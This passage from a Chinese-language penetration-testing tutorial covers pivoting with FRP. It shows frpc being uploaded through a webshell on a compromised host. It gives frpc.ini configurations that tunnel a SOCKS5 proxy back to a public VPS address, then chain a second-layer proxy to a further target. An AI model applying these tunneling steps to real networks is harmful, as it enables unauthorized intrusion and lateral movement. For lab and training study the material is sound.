#### （2）Target1启动frpc
- 获取的webshell上传frpc
![Pasted image 20250220231620.png](http://gzxingyu.cloud/wp-content/uploads/2025/02/Pasted-image-20250220231620.png)
- 修改如下的frpc.ini配置文件
```
[common]
server_addr = 120.79.150.243
server_port = 7000

[socks5]
type = tcp
plugin = socks5
remote_port = 10998
```
7000是监听端口
10998是开启socks服务的端口

- 给予frpc执行权限并执行
```
chmod +x frpc

./frpc -c frpc.ini
```

### 3）FRP建立二层Socks代理
#### （1）修改frpc.ini配置文件（在原来的基础上添加代理转发，将本地的10089端口转发到vps的21000端口）
```
[common]
server_addr = 120.79.150.243
server_port = 7000

[socks5]
type = tcp
remote_port = 10998
plugin = socks5

[socks5_10998]
type = tcp
local_ip = 127.0.0.1
local_port = 10089
remote_port = 21000
```

#### （2）Target1启动frpc
```
./frpc -c frpc.ini
```

#### （3）Target1启动frps
```
./frps -c frps.ini
```

#### （4）Target2启动frpc
```
./frpc -c frpc.ini
```
